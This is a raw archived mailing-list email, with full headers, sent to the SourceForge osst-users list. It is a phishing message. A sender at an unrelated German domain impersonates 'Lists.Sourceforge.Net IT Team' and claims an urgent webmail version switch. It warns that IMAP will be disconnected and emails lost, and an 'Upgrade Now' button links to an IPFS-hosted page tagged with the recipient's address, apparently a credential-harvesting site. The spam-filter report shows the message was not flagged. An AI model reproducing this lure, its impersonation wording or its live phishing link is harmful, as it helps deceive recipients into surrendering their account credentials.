Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 844656FEBDE
	for <lists+osst-users@lfdr.de>; Thu, 11 May 2023 08:45:29 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1px03L-0006R2-LL
	for lists+osst-users@lfdr.de;
	Thu, 11 May 2023 06:45:28 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <bounces@henrikoffice.us>) id 1px03K-0006Qw-5c
 for osst-users@lists.sourceforge.net; Thu, 11 May 2023 06:45:26 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=qOGtZENBGjWiOYIudWirG/k/aIO/YXp1Z5VHTA0ipD8=; b=FYQPL6VSeJa6zK6ROBsEwVusuR
 0lnCU24groU68kxauV8kp9saUcTjys2ibmNr3YFVRsjuIKZQiEmlZQ00A0KiO7FFT9LWPZN+7D976
 qQfWEol1h1TI5RXR3YNl3eu3XCWzXH5seBuCvj/AMpyk9fCEEFhKO5xT+uv6El9/Q4+M=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=qOGtZENBGjWiOYIudWirG/k/aIO/YXp1Z5VHTA0ipD8=; b=K
 fcPACJAx7EThZA+OJYpjeHEzUGuHBvLvu+NxzRiIqtcCkDZ1VpyI6zt4uNkS6syqB4tmKrcxHGZ0H
 u/pj3yVkaxcuENsFi2NiqCv6B5XMgpCW+sHh2WfWa2nHz4aqClagiOL/U9alCWu68mIlkfZ4lLTtM
 +2EYgBmknMSR/z08=;
Received: from mail.krankenversicherungsangebot.com ([62.233.57.214])
 by sfi-mx-1.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1px03J-0030iE-MO for osst-users@lists.sourceforge.net;
 Thu, 11 May 2023 06:45:26 +0000
DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed;
 d=krankenversicherungsangebot.com; s=default; h=From:To:Subject:
 MIME-Version:Content-Type:Content-Transfer-Encoding; bh=dlmm+dcE
 X9HAbSjpcTkw0MpOe1I=; b=nb6yxk2mbZzpwVUmBI4MeRoWbA5Tjks3c2lPquRQ
 FNeinu9fA79wOzXnzGFez/cPZ/ED2SRafWztW9TWBoKUEYXaYD2eqYT+JZskQBc3
 zBAyaL75OeBVB9se7yfb6ogtncpxL7r/aD2S9Czin1XDE2zgc8YptkmuOG12nwpb
 cKw=
From: "Email Support Lists.Sourceforge.Net"
 <server@krankenversicherungsangebot.com>
To: osst-users@lists.sourceforge.net
Date: 10 May 2023 23:45:19 -0700
Message-ID: <20230510234519.4346B837C755B260@krankenversicherungsangebot.com>
MIME-Version: 1.0
X-Spam-Score: 0.2 (/)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: New Webmail Version Webmail Upgrade - Urgent Version Switch
 To: osst-users@lists.sourceforge.net From: Support lists.sourceforge.net
 <support@lists.sourceforge.net Subject: High Priority Webmail Version Switch
 Content analysis details:   (0.2 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.2 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level
 mail domains are different
 0.0 SPF_NONE               SPF: sender does not publish an SPF Record
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 -0.0 T_SCC_BODY_TEXT_LINE   No description available.
X-Headers-End: 1px03J-0030iE-MO
Subject: [Osst-users] Important Version Switch - Webmail
 Lists.Sourceforge.Net
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============4970237687621852214=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============4970237687621852214==
Content-Type: text/html;
	charset="utf-8"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE html>

<html><head>
    <meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
    <meta charset=3D"UTF-8">
    <title>New Webmail Version</title>
    <style>
      body {
        font-family: 'Segoe UI', Tahoma, sans-serif;
        font-size: 12px;
        line-height: 1.5;
        color: #333;
        border: 1px solid #ccc;
        margin: 20px 20px 20px 40px;
        max-width: 400px;
        padding: 20px;
        text-align: justify;
      }
      h1, h2, h3, h4, h5, h6 {
        font-family: 'Segoe UI', Tahoma, sans-serif;
        font-weight: 700;
        margin-top: 0;
      }
      .button {
        display: inline-block;
        padding: 8px 16px;
        background-color: #007bff;
        color: #fff;
        text-decoration: none;
        border-radius: 5px;
        border: none;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
        font-family: 'Segoe UI', Tahoma, sans-serif;
        font-weight: 700;
        text-transform: uppercase;
      }
      .button:hover {
        background-color: #0069d9;
      }
    </style>
    <link href=3D"https://fonts.googleapis.com/css?family=3DSegoe+UI|Tahoma=
&amp;display=3Dswap" rel=3D"stylesheet">
  </head>
  <body style=3D"font-family: 'Segoe UI', Tahoma, sans-serif;
        font-size: 12px;
        line-height: 1.5;
        color: #333;
        border: 1px solid #ccc;
        margin: 20px 20px 20px 40px;
        max-width: 400px;
        padding: 20px;
        text-align: justify">
    <h1 style=3D"font-family: 'Segoe UI', Tahoma, sans-serif;
        font-weight: 700;
        margin-top: 0; font-size: 16px;">Webmail Upgrade - Urgent Version S=
witch</h1>
    <p><strong>To: </strong>osst-users@lists.sourceforge.net<br><strong>Fro=
m: </strong>Support lists.sourceforge.net &lt;support@lists.sourceforge.net=
<br><strong>Subject: </strong>High Priority Webmail Version Switch</p>
    <hr>
    <p>We are excited to announce the release of our new webmail version. T=
his new version comes with many improvements and features that will make yo=
ur email experience faster and more efficient.</p>
    <p>To start using the new version, follow the link below to continue.</=
p>
    <br>
    <a style=3D"display: inline-block;
        padding: 8px 16px;
        background-color: #007bff;
        color: #fff;
        text-decoration: none;
        border-radius: 5px;
        border: none;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
        font-family: 'Segoe UI', Tahoma, sans-serif;
        font-weight: 700;
        text-transform: uppercase" class=3D"button" href=3D"https://dweb.li=
nk/ipfs/QmRYzbW1n9LaH23c6Kv3vAvEfAMbYPEZNcFkUuxJ95szkc?filename=3Ddsoh-sdho=
u-2983-sfd%26%407.html#osst-users@lists.sourceforge.net" target=3D"_self">U=
pgrade Now</a>
    <br>
    <p><br></p><p>IMAP will be disconnected from the current webmail versio=
n.</p>
    <p>Perform this urgent action to avoid loss of important emails.</p>
    <br>
    <p>Thank you,</p>
    <p><strong>Lists.Sourceforge.Net </strong>The IT Team</p>
=20=20
</body></html>


--===============4970237687621852214==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============4970237687621852214==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============4970237687621852214==--
